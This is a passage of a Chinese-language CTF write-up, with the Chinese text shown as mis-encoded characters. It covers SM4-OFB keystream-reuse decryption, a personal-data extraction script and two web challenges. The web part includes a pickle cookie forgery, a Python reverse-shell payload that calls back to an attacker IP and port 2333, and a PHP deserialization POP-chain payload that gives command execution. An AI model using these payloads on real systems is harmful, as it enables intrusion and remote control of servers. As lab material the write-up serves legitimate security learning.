----------------------- # These are taken from the CTF prompt / earlier messages. Change them if needed. KNOWN_NAME_PLAIN = \u0026#34;è’‹å®ç²\u0026#34; # record1 known plaintext for name field KNOWN_NAME_CIPHER_HEX = \u0026#34;cef18c919f99f9ea19905245fae9574e\u0026#34; # record1 name ciphertext hex IV_HEX = \u0026#34;6162636465666768696a6b6c6d6e6f70\u0026#34; # the IV column (fixed) # Block size for SM4 (16 bytes) BS = 16 # ----------------------- # ----- Helpers --------- # ----------------------- def xor_bytes(a: bytes, b: bytes) -\u0026gt; bytes: return bytes(x ^ y for x, y in zip(a, b)) def split_blocks(b: bytes, bs: int = BS): return [b[i:i+bs] for i in range(0, len(b), bs)] # ----------------------- # ----- Derive keystream from the known pair # ----------------------- def derive_keystream_from_known(known_plain: str, known_cipher_hex: str): p = known_plain.encode(\u0026#39;utf-8\u0026#39;) c = unhexlify(known_cipher_hex) p_padded = pad(p, BS) p_blocks = split_blocks(p_padded) c_blocks = split_blocks(c) if len(p_blocks) != len(c_blocks): raise ValueError(\u0026#39;Known plaintext/cipher block count mismatch\u0026#39;) ks_blocks = [xor_bytes(cb, pb) for cb, pb in zip(c_blocks, p_blocks)] return ks_blocks # ----------------------- # ----- Recovery -------- # ----------------------- def recover_name_from_cipher_hex(cipher_hex: str, ks_blocks): c = unhexlify(cipher_hex.strip()) c_blocks = split_blocks(c) # If there are more cipher blocks than ks_blocks, warn and reuse ks cyclically if len(c_blocks) \u0026gt; len(ks_blocks): print(\u0026#34;[WARN] cipher needs %d blocks but only %d keystream blocks available; reusing keystream cyclically\u0026#34; % (len(c_blocks), len(ks_blocks)), file=sys.stderr) recovered_blocks = [] for i, cb in enumerate(c_blocks): ks = ks_blocks[i % len(ks_blocks)] recovered_blocks.append(xor_bytes(cb, ks)) recovered_padded = b\u0026#39;\u0026#39;.join(recovered_blocks) # Try to unpad and decode; if fails, return hex of raw bytes try: recovered = unpad(recovered_padded, BS).decode(\u0026#39;utf-8\u0026#39;) except Exception: try: recovered = recovered_padded.decode(\u0026#39;utf-8\u0026#39;) except Exception: recovered = \u0026#39;\u0026lt;raw:\u0026#39; + recovered_padded.hex() + \u0026#39;\u0026gt;\u0026#39; return recovered # ----------------------- # ----- Main ----------- # ----------------------- def main(): if len(sys.argv) != 2: print(\u0026#39;Usage: python3 sm4_ofb_batch_decrypt_names.py \u0026lt;names_cipher_file\u0026gt;\u0026#39;, file=sys.stderr) sys.exit(2) inpath = sys.argv[1] ks_blocks = derive_keystream_from_known(KNOWN_NAME_PLAIN, KNOWN_NAME_CIPHER_HEX) with open(inpath, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: for lineno, line in enumerate(f, 1): line = line.strip() if not line: continue # Assume each line is one hex-encoded name ciphertext (no spaces) try: recovered = recover_name_from_cipher_hex(line, ks_blocks) except Exception as e: recovered = \u0026#39;\u0026lt;error: %s\u0026gt;\u0026#39; % str(e) print(f\u0026#34;{recovered}\\t{line}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() æœç´¢ï¼Œå‘ç°ä¸ä½•æµ©ç’å¯¹åº”çš„å¯†æ–‡æ˜¯c2de929284bff9f63b905245fae9574eï¼Œå†å»Excelé‡Œæœè¿™ä¸²å¯†æ–‡å¯¹åº”çš„èº«ä»½è¯å·çš„å¯†æ–‡ï¼Œå¾—åˆ°ï¼š1751374401262f5d9ca36576ccde617fad8baace87de269e6659fdbc1f3ea41cï¼Œå†ç”¨ä¸Šé¢é‚£ä¸ªè„šæœ¬è§£å‡ºæ¥ï¼š120000197404101676ï¼Œè®¡ç®—md5ï¼šfbb80148b75e98b18d65be446f505fccå³ä¸ºFlagã€‚\ndataIdSort\rå°†éœ€æ±‚ä¸¢ç»™AIï¼Œè®©AIå†™äº†ä¸ªè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 #!/usr/bin/env python3 # coding: utf-8 \u0026#34;\u0026#34;\u0026#34; åŠŸèƒ½ï¼š - ä» data.txt ä¸­æŒ‰é¡ºåºç²¾ç¡®æå–ï¼šèº«ä»½è¯(idcard)ã€æ‰‹æœºå·(phone)ã€é“¶è¡Œå¡(bankcard)ã€IPv4(ip)ã€MAC(mac)ã€‚ - ä¸¥æ ¼éµå¾ªã€Šä¸ªäººä¿¡æ¯æ•°æ®è§„èŒƒæ–‡æ¡£ã€‹ï¼Œä¼˜åŒ–æ­£åˆ™è¡¨è¾¾å¼å’ŒåŒ¹é…ç­–ç•¥ä»¥è¾¾åˆ°é«˜å‡†ç¡®ç‡ã€‚ - æ‰€æœ‰åŒ¹é…é¡¹å‡ä¿ç•™åŸå§‹æ ¼å¼ï¼Œå¹¶è¾“å‡ºåˆ° output.csv æ–‡ä»¶ä¸­ã€‚ \u0026#34;\u0026#34;\u0026#34; import re import csv from datetime import datetime # ------------------- é…ç½® ------------------- INPUT_FILE = \u0026#34;data.txt\u0026#34; OUTPUT_FILE = \u0026#34;output.csv\u0026#34; DEBUG = False # è®¾ç½®ä¸º True ä»¥åœ¨æ§åˆ¶å°æ‰“å°è¯¦ç»†çš„æ¥å—/æ‹’ç»æ—¥å¿— # æ‰‹æœºå·å‰ç¼€ç™½åå• ALLOWED_MOBILE_PREFIXES = { \u0026#34;134\u0026#34;, \u0026#34;135\u0026#34;, \u0026#34;136\u0026#34;, \u0026#34;137\u0026#34;, \u0026#34;138\u0026#34;, \u0026#34;139\u0026#34;, \u0026#34;147\u0026#34;, \u0026#34;148\u0026#34;, \u0026#34;150\u0026#34;, \u0026#34;151\u0026#34;, \u0026#34;152\u0026#34;, \u0026#34;157\u0026#34;, \u0026#34;158\u0026#34;, \u0026#34;159\u0026#34;, \u0026#34;172\u0026#34;, \u0026#34;178\u0026#34;, \u0026#34;182\u0026#34;, \u0026#34;183\u0026#34;, \u0026#34;184\u0026#34;, \u0026#34;187\u0026#34;, \u0026#34;188\u0026#34;, \u0026#34;195\u0026#34;, \u0026#34;198\u0026#34;, \u0026#34;130\u0026#34;, \u0026#34;131\u0026#34;, \u0026#34;132\u0026#34;, \u0026#34;140\u0026#34;, \u0026#34;145\u0026#34;, \u0026#34;146\u0026#34;, \u0026#34;155\u0026#34;, \u0026#34;156\u0026#34;, \u0026#34;166\u0026#34;, \u0026#34;167\u0026#34;, \u0026#34;171\u0026#34;, \u0026#34;175\u0026#34;, \u0026#34;176\u0026#34;, \u0026#34;185\u0026#34;, \u0026#34;186\u0026#34;, \u0026#34;196\u0026#34;, \u0026#34;133\u0026#34;, \u0026#34;149\u0026#34;, \u0026#34;153\u0026#34;, \u0026#34;173\u0026#34;, \u0026#34;174\u0026#34;, \u0026#34;177\u0026#34;, \u0026#34;180\u0026#34;, \u0026#34;181\u0026#34;, \u0026#34;189\u0026#34;, \u0026#34;190\u0026#34;, \u0026#34;191\u0026#34;, \u0026#34;193\u0026#34;, \u0026#34;199\u0026#34; } # --------------------------------------------- # ------------------- æ ¡éªŒå‡½æ•° ------------------- def luhn_check(digits: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;å¯¹æ•°å­—å­—ç¬¦ä¸²æ‰§è¡ŒLuhnç®—æ³•æ ¡éªŒã€‚\u0026#34;\u0026#34;\u0026#34; s = 0 alt = False for char in reversed(digits): d = int(char) if alt: d *= 2 if d \u0026gt; 9: d -= 9 s += d alt = not alt return s % 10 == 0 def is_valid_id(raw: str): \u0026#34;\u0026#34;\u0026#34;æ ¡éªŒèº«ä»½è¯å·çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦ã€æ ¼å¼ã€å‡ºç”Ÿæ—¥æœŸã€æ ¡éªŒç ï¼‰ã€‚\u0026#34;\u0026#34;\u0026#34; sep_pattern = r\u0026#39;[\\s\\-\\u00A0\\u3000\\u2013\\u2014]\u0026#39; s = re.sub(sep_pattern, \u0026#39;\u0026#39;, raw) if len(s) != 18 or not re.match(r\u0026#39;^\\d{17}[0-9Xx]$\u0026#39;, s): return False, \u0026#34;æ— æ•ˆçš„æ ¼å¼æˆ–é•¿åº¦\u0026#34; try: birth_date = datetime.strptime(s[6:14], \u0026#34;%Y%m%d\u0026#34;) if not (1900 \u0026lt;= birth_date.year \u0026lt;= datetime.now().year): return False, f\u0026#34;æ— æ•ˆçš„å‡ºç”Ÿå¹´ä»½: {birth_date.year}\u0026#34; except ValueError: return False, \u0026#34;æ— æ•ˆçš„å‡ºç”Ÿæ—¥æœŸ\u0026#34; weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2] check_map = [\u0026#39;1\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;2\u0026#39;] total = sum(int(digit) * weight for digit, weight in zip(s[:17], weights)) expected_check = check_map[total % 11] if s[17].upper() != expected_check: return False, f\u0026#34;æ ¡éªŒç ä¸åŒ¹é…: æœŸæœ›å€¼ {expected_check}\u0026#34; return True, \u0026#34;\u0026#34; def is_valid_phone(raw: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;æ ¡éªŒæ‰‹æœºå·çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦å’Œå·æ®µï¼‰ã€‚\u0026#34;\u0026#34;\u0026#34; digits = re.sub(r\u0026#39;\\D\u0026#39;, \u0026#39;\u0026#39;, raw) if digits.startswith(\u0026#34;86\u0026#34;) and len(digits) \u0026gt; 11: digits = digits[2:] return len(digits) == 11 and digits[:3] in ALLOWED_MOBILE_PREFIXES def is_valid_bankcard(raw: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;æ ¡éªŒé“¶è¡Œå¡å·çš„æœ‰æ•ˆæ€§ï¼ˆ16-19ä½çº¯æ•°å­— + Luhnç®—æ³•ï¼‰ã€‚\u0026#34;\u0026#34;\u0026#34; if not (16 \u0026lt;= len(raw) \u0026lt;= 19 and raw.isdigit()): return False return luhn_check(raw) def is_valid_ip(raw: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;æ ¡éªŒIPv4åœ°å€çš„æœ‰æ•ˆæ€§ï¼ˆ4ä¸ª0-255çš„æ•°å­—ï¼Œä¸å…è®¸å‰å¯¼é›¶ï¼‰ã€‚\u0026#34;\u0026#34;\u0026#34; parts = raw.split(\u0026#39;.\u0026#39;) if len(parts) != 4: return False # æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ— æ•ˆéƒ¨åˆ†ï¼Œå¦‚ \u0026#39;01\u0026#39; if any(len(p) \u0026gt; 1 and p.startswith(\u0026#39;0\u0026#39;) for p in parts): return False return all(p.isdigit() and 0 \u0026lt;= int(p) \u0026lt;= 255 for p in parts) def is_valid_mac(raw: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;æ ¡éªŒMACåœ°å€çš„æœ‰æ•ˆæ€§ã€‚\u0026#34;\u0026#34;\u0026#34; # æ­£åˆ™è¡¨è¾¾å¼å·²ç»éå¸¸ä¸¥æ ¼ï¼Œè¿™é‡Œä»…åšæœ€ç»ˆç¡®è®¤ return re.fullmatch(r\u0026#39;([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\u0026#39;, raw, re.IGNORECASE) is not None # ------------------- æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰ ------------------- # æ¨¡å¼çš„é¡ºåºç»è¿‡ç²¾å¿ƒè®¾è®¡ï¼Œä»¥å‡å°‘åŒ¹é…æ­§ä¹‰ï¼šä¼˜å…ˆåŒ¹é…æ ¼å¼æœ€ç‰¹æ®Šçš„ã€‚ # 1. MACåœ°å€ï¼šæ ¼å¼æ˜ç¡®ï¼Œä½¿ç”¨å†’å·åˆ†éš”ã€‚ mac_pattern = r\u0026#39;(?P\u0026lt;mac\u0026gt;(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\u0026#39; # 2. IPåœ°å€ï¼šæ ¼å¼æ˜ç¡®ï¼Œä½¿ç”¨ç‚¹åˆ†éš”ã€‚è¯¥æ­£åˆ™æ›´ç²¾ç¡®ï¼Œé¿å…åŒ¹é…å¦‚ 256.1.1.1 çš„æ— æ•ˆIPã€‚ ip_pattern = r\u0026#39;(?P\u0026lt;ip\u0026gt;(?\u0026lt;!\\d)(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?!\\d))\u0026#39; # 3. èº«ä»½è¯å·ï¼šç»“æ„ä¸º 6-8-4ï¼Œé•¿åº¦å›ºå®šï¼Œæ¯”çº¯æ•°å­—çš„é“¶è¡Œå¡æ›´å…·ç‰¹å¼‚æ€§ã€‚ sep = r\u0026#39;[\\s\\-\\u00A0\\u3000\\u2013\\u2014]\u0026#39; id_pattern = rf\u0026#39;(?P\u0026lt;id\u0026gt;(?\u0026lt;!\\d)\\d{{6}}(?:{sep}*)\\d{{8}}(?:{sep}*)\\d{{3}}[0-9Xx](?!\\d))\u0026#39; # 4. é“¶è¡Œå¡å·ï¼šåŒ¹é…16-19ä½çš„è¿ç»­æ•°å­—ã€‚è¿™æ˜¯æœ€é€šç”¨çš„é•¿æ•°å­—æ¨¡å¼ä¹‹ä¸€ï¼Œæ”¾åœ¨åé¢åŒ¹é…ã€‚ bankcard_pattern = r\u0026#39;(?P\u0026lt;bankcard\u0026gt;(?\u0026lt;!\\d)\\d{16,19}(?!\\d))\u0026#39; # 5. æ‰‹æœºå·ï¼šåŒ¹é…11ä½æ•°å­—çš„ç‰¹å®šæ ¼å¼ï¼Œæ”¾åœ¨æœ€åä»¥é¿å…é”™è¯¯åŒ¹é…æ›´é•¿æ•°å­—ä¸²çš„å‰ç¼€ã€‚ phone_prefix = r\u0026#39;(?:\\(\\+86\\)|\\+86\\s*)\u0026#39; phone_body = r\u0026#39;(?:\\d{11}|\\d{3}[ -]\\d{4}[ -]\\d{4})\u0026#39; phone_pattern = rf\u0026#39;(?P\u0026lt;phone\u0026gt;(?\u0026lt;!\\d)(?:{phone_prefix})?{phone_body}(?!\\d))\u0026#39; # å°†æ‰€æœ‰æ¨¡å¼ç¼–è¯‘æˆä¸€ä¸ªå¤§çš„æ­£åˆ™è¡¨è¾¾å¼ combined_re = re.compile( f\u0026#39;{mac_pattern}|{ip_pattern}|{id_pattern}|{bankcard_pattern}|{phone_pattern}\u0026#39;, flags=re.UNICODE | re.IGNORECASE ) # ------------------- ä¸»é€»è¾‘ ------------------- def extract_from_text(text: str): \u0026#34;\u0026#34;\u0026#34; ä½¿ç”¨å•ä¸€çš„ã€ç»„åˆçš„æ­£åˆ™è¡¨è¾¾å¼ä»æ–‡æœ¬ä¸­æŸ¥æ‰¾æ‰€æœ‰å€™é€‰è€…ï¼Œå¹¶é€ä¸€æ ¡éªŒã€‚ \u0026#34;\u0026#34;\u0026#34; results = [] for match in combined_re.finditer(text): kind = match.lastgroup value = match.group(kind) if kind == \u0026#39;mac\u0026#39;: if is_valid_mac(value): if DEBUG: print(f\u0026#34;ã€æ¥å— macã€‘: {value}\u0026#34;) results.append((\u0026#39;mac\u0026#39;, value)) elif DEBUG: print(f\u0026#34;ã€æ‹’ç» macã€‘: {value}\u0026#34;) elif kind == \u0026#39;ip\u0026#39;: if is_valid_ip(value): if DEBUG: print(f\u0026#34;ã€æ¥å— ipã€‘: {value}\u0026#34;) results.append((\u0026#39;ip\u0026#39;, value)) elif DEBUG: print(f\u0026#34;ã€æ‹’ç» ipã€‘: {value}\u0026#34;) elif kind == \u0026#39;id\u0026#39;: is_valid, reason = is_valid_id(value) if is_valid: if DEBUG: print(f\u0026#34;ã€æ¥å— idcardã€‘: {value}\u0026#34;) results.append((\u0026#39;idcard\u0026#39;, value)) else: # é™çº§å¤„ç†ï¼šå¦‚æœä½œä¸ºèº«ä»½è¯æ ¡éªŒå¤±è´¥ï¼Œåˆ™å°è¯•ä½œä¸ºé“¶è¡Œå¡æ ¡éªŒ digits_only = re.sub(r\u0026#39;\\D\u0026#39;, \u0026#39;\u0026#39;, value) if is_valid_bankcard(digits_only): if DEBUG: print(f\u0026#34;ã€æ¥å— id-\u0026gt;bankcardã€‘: {value}\u0026#34;) # è§„èŒƒè¦æ±‚ä¿ç•™åŸå§‹æ ¼å¼ results.append((\u0026#39;bankcard\u0026#39;, value)) elif DEBUG: print(f\u0026#34;ã€æ‹’ç» idã€‘: {value} (åŸå› : {reason})\u0026#34;) elif kind == \u0026#39;bankcard\u0026#39;: if is_valid_bankcard(value): if DEBUG: print(f\u0026#34;ã€æ¥å— bankcardã€‘: {value}\u0026#34;) results.append((\u0026#39;bankcard\u0026#39;, value)) elif DEBUG: print(f\u0026#34;ã€æ‹’ç» bankcardã€‘: {value}\u0026#34;) elif kind == \u0026#39;phone\u0026#39;: if is_valid_phone(value): if DEBUG: print(f\u0026#34;ã€æ¥å— phoneã€‘: {value}\u0026#34;) results.append((\u0026#39;phone\u0026#39;, value)) elif DEBUG: print(f\u0026#34;ã€æ‹’ç» phoneã€‘: {value}\u0026#34;) return results def main(): \u0026#34;\u0026#34;\u0026#34;ä¸»å‡½æ•°ï¼šè¯»å–æ–‡ä»¶ï¼Œæ‰§è¡Œæå–ï¼Œå†™å…¥CSVã€‚\u0026#34;\u0026#34;\u0026#34; try: with open(INPUT_FILE, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;) as f: text = f.read() except FileNotFoundError: print(f\u0026#34;é”™è¯¯: è¾“å…¥æ–‡ä»¶ \u0026#39;{INPUT_FILE}\u0026#39; æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿è¯¥æ–‡ä»¶å­˜åœ¨äºè„šæœ¬è¿è¡Œç›®å½•ä¸‹ã€‚\u0026#34;) # åˆ›å»ºä¸€ä¸ªç©ºçš„data.txtä»¥ç¡®ä¿è„šæœ¬å¯ä»¥è¿è¡Œ with open(INPUT_FILE, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: f.write(\u0026#34;\u0026#34;) print(f\u0026#34;å·²è‡ªåŠ¨åˆ›å»ºç©ºçš„ \u0026#39;{INPUT_FILE}\u0026#39;ã€‚è¯·å‘å…¶ä¸­å¡«å……éœ€è¦åˆ†æçš„æ•°æ®ã€‚\u0026#34;) text = \u0026#34;\u0026#34; extracted_data = extract_from_text(text) with open(OUTPUT_FILE, \u0026#34;w\u0026#34;, newline=\u0026#34;\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as csvfile: writer = csv.writer(csvfile) writer.writerow([\u0026#34;category\u0026#34;, \u0026#34;value\u0026#34;]) writer.writerows(extracted_data) print(f\u0026#34;åˆ†æå®Œæˆã€‚å…±è¯†åˆ« {len(extracted_data)} æ¡æœ‰æ•ˆæ•æ„Ÿæ•°æ®ã€‚ç»“æœå·²ä¿å­˜è‡³ \u0026#39;{OUTPUT_FILE}\u0026#39;ã€‚\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() è¿è¡Œï¼Œå¾—åˆ°export.csvï¼Œä¸Šä¼ ï¼Œæ­£ç¡®ç‡\u0026gt;=98%å³å¯å¾—åˆ°Flagï¼šDASCTF{34164200333121342836358909307523}\nWEB\rez_blog\ræ‰“å¼€ç½‘é¡µï¼Œå‘ç°è¦ç™»å½•ï¼Œæ ¹æ®æç¤ºï¼Œå°è¯•ä½¿ç”¨ç”¨æˆ·åguestå¯†ç guestæˆåŠŸç™»å½•è®¿å®¢ï¼Œå‘ç°Cookiesè®°å½•äº†ä¸€ä¸ªToken=8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622eã€‚é€šè¿‡AIåˆ†æï¼Œå¯çŸ¥è¿™æ˜¯pickleç»è¿‡åºåˆ—åŒ–ç„¶åè½¬æ¢æˆhexå¾—åˆ°çš„ï¼Œè§£ç å¯å‘ç°ï¼šKappUser)}(idusernameguesis_admin logged_inub.ï¼Œå°è¯•é€šè¿‡ä¿®æ”¹é‡Œé¢çš„å†…å®¹ï¼Œå°†usernameæ”¹æˆadminï¼Œis_adminæ”¹æˆTrueï¼Œå¾—åˆ°ï¼š8004954b000000000000008c03617070948c04557365729493942981947d9428 8c026964944b028c08757365726e616d65948c0561646d696e948c0869735f61 646d696e94888c096c6f676765645f696e948875622eï¼Œé€šè¿‡BurpSuiteä¿®æ”¹è¯·æ±‚æ—¶çš„Cookiesï¼ŒæˆåŠŸæ‹¿åˆ°adminç”¨æˆ·çš„æƒé™ï¼ˆå¯ä»¥åˆ›å»ºæ–‡ç« ï¼‰ï¼š ä¹Ÿå°±æ˜¯è¯´ï¼ŒæœåŠ¡ç«¯ä¼šå°†Tokenååºåˆ—åŒ–ï¼Œå¯ä»¥ä»¥æ­¤åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ã€‚å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œåªèƒ½åå¼¹shellã€‚ç¼–å†™Payloadï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import pickle import time import binascii import os class Exploit: def __reduce__(self): return (os.system, (\u0026#39;\u0026#39;\u0026#39;python3 -c \u0026#34;import os import socket import subprocess s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#39;\u0026lt;Your IP\u0026gt;\u0026#39;, 2333)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) p = subprocess.call([\u0026#39;/bin/sh\u0026#39;, \u0026#39;-i\u0026#39;])\u0026#34;\u0026#39;\u0026#39;\u0026#39;,)) payload = pickle.dumps(Exploit()) hex_token = binascii.hexlify(payload).decode() print(hex_token) print(payload) obj = pickle.loads(payload) è¿è¡Œå¾—åˆ°Payloadï¼š80049510010000000000008c05706f736978948c0673797374656d9493948cf5707974686f6e33202d632022696d706f7274206f730a696d706f727420736f636b65740a696d706f72742073756270726f636573730a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c20736f636b65742e534f434b5f53545245414d290a732e636f6e6e6563742828273c596f75722049503e272c203233333329290a6f732e6475703228732e66696c656e6f28292c2030290a6f732e6475703228732e66696c656e6f28292c2031290a6f732e6475703228732e66696c656e6f28292c2032290a70203d2073756270726f636573732e63616c6c285b272f62696e2f7368272c20272d69275d292294859452942eï¼ŒæœåŠ¡å™¨ä¸Šè¿è¡Œnc -lvvp 2333ï¼Œå°†Payloadä½œä¸ºTokenå‘é€è¯·æ±‚åæˆåŠŸæ‹¿åˆ°Shellã€‚Flagå­˜æ”¾åœ¨/thisisthefffflllaaaggg.txtä¸­ï¼š å¾—åˆ°Flagï¼šDASCTF{15485426979172729258466667411440}\nez_unserialize\ré¢˜ç›®æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class A { public $first; public $step; public $next; public function __construct() { $this-\u0026gt;first = \u0026#34;ç»§ç»­åŠ æ²¹ï¼\u0026#34;; } public function start() { echo $this-\u0026gt;next; } } class E { private $you; public $found; private $secret = \u0026#34;admin123\u0026#34;; public function __get($name){ if($name === \u0026#34;secret\u0026#34;) { echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$name.\u0026#34; maybe is here!\u0026lt;/br\u0026gt;\u0026#34;; $this-\u0026gt;found-\u0026gt;check(); } } } class F { public $fifth; public $step; public $finalstep; public function check() { if(preg_match(\u0026#34;/U/\u0026#34;,$this-\u0026gt;finalstep)) { echo \u0026#34;ä»”ç»†æƒ³æƒ³ï¼\u0026#34;; } else { $this-\u0026gt;step = new $this-\u0026gt;finalstep(); ($this-\u0026gt;step)(); } } } class H { public $who; public $are; public $you; public function __construct() { $this-\u0026gt;you = \u0026#34;nobody\u0026#34;; } public function __destruct() { $this-\u0026gt;who-\u0026gt;start(); } } class N { public $congratulation; public $yougotit; public function __call(string $func_name, array $args) { return call_user_func($func_name,$args[0]); } } class U { public $almost; public $there; public $cmd; public function __construct() { $this-\u0026gt;there = new N(); $this-\u0026gt;cmd = $_POST[\u0026#39;cmd\u0026#39;]; } public function __invoke() { return $this-\u0026gt;there-\u0026gt;system($this-\u0026gt;cmd); } } class V { public $good; public $keep; public $dowhat; public $go; public function __toString() { $abc = $this-\u0026gt;dowhat; $this-\u0026gt;go-\u0026gt;$abc; return \u0026#34;\u0026lt;br\u0026gt;Win!!!\u0026lt;/br\u0026gt;\u0026#34;; } } unserialize($_POST[\u0026#39;payload\u0026#39;]); ?\u0026gt; åˆ©ç”¨æ€è·¯ï¼ˆç®€çŸ­ï¼‰\nåˆ©ç”¨ H::__destruct() åœ¨å¯¹è±¡é”€æ¯æ—¶è§¦å‘ who-\u0026gt;start()ã€‚ A::start() echo $this-\u0026gt;nextï¼Œå› æ­¤æŠŠ next è®¾ä¸º V çš„å®ä¾‹ï¼Œä½¿ V::__toString() è¢«è°ƒç”¨ã€‚ V::__toString() ä¼šè¯»å– $this-\u0026gt;go-\u0026gt;$abcï¼Œå¦‚æœ dowhat = \u0026quot;secret\u0026quot; ä¸” go æ˜¯ E çš„å®ä¾‹ï¼Œåˆ™ä¼šè§¦å‘ E::__get(\u0026quot;secret\u0026quot;)ã€‚ E::__get ä¼šè°ƒç”¨ $this-\u0026gt;found-\u0026gt;check()ï¼Œå…¶ä¸­ found æ˜¯ F çš„å®ä¾‹ã€‚ F::check() æ–°å»º $this-\u0026gt;finalstep() å¹¶éšå ($this-\u0026gt;step)() è°ƒç”¨å¯¹è±¡ã€‚å¦‚æœè®¾ç½® finalstep = \u0026quot;u\u0026quot;ï¼ˆå°å†™ï¼‰ï¼Œnew 'u' ä¼š case-insensitive å®ä¾‹åŒ–ç±» Uï¼Œä»è€Œç»•è¿‡ preg_match(\u0026quot;/U/\u0026quot;) çš„é˜»æ–­ã€‚ U::__construct() æ„é€  Nï¼ˆåœ¨é‚£é‡Œå®šä¹‰äº† __callï¼‰ï¼Œå¹¶æŠŠ cmd = $_POST['cmd']ã€‚U::__invoke() è°ƒç”¨ $this-\u0026gt;there-\u0026gt;system($this-\u0026gt;cmd)ï¼Œè§¦å‘ N::__call() ä½¿ç”¨ call_user_func('system', ...) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ =\u0026gt; æœ€ç»ˆè¾¾åˆ° system($_POST['cmd']) æ‰§è¡Œã€‚ ç›´æ¥å¯ç”¨çš„åºåˆ—åŒ– payloadï¼ˆå·²æ‰‹å·¥æ„é€ ï¼‰\n1 O:1:\u0026#34;H\u0026#34;:1:{s:3:\u0026#34;who\u0026#34;;O:1:\u0026#34;A\u0026#34;:1:{s:4:\u0026#34;next\u0026#34;;O:1:\u0026#34;V\u0026#34;:2:{s:6:\u0026#34;dowhat\u0026#34;;s:6:\u0026#34;secret\u0026#34;;s:2:\u0026#34;go\u0026#34;;O:1:\u0026#34;E\u0026#34;:1:{s:5:\u0026#34;found\u0026#34;;O:1:\u0026#34;F\u0026#34;:1:{s:9:\u0026#34;finalstep\u0026#34;;s:1:\u0026#34;u\u0026#34;;}}}}} è§£é¢˜è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 \u0026lt;?php /** * pop_chain_generator.php * * è¿™ä¸ªè„šæœ¬ç”¨äºç”Ÿæˆæœ¬é¢˜çš„ POP chainï¼ˆPHP åºåˆ—åŒ– payloadï¼‰ã€‚ * * ä½¿ç”¨æ–¹æ³•ï¼š * 1. åœ¨æœ¬åœ°ä¿å­˜ä¸º pop_chain_generator.php * 2. è¿è¡Œï¼š php pop_chain_generator.php * 3. ç¨‹åºä¼šè¾“å‡ºä¸‰ç§æ ¼å¼ï¼š * - åŸå§‹åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆç›´æ¥åœ¨ç›®æ ‡é¡µé¢çš„ payload å‚æ•°ä½¿ç”¨ï¼‰ * - URL encodedï¼ˆå¯ç›´æ¥æ”¾å…¥ curl çš„ --data-urlencodeï¼‰ * - Base64 ç¼–ç ï¼ˆä¸€äº›é¢˜ç›®æŠŠ payload æ”¾åˆ° header æˆ– cookie 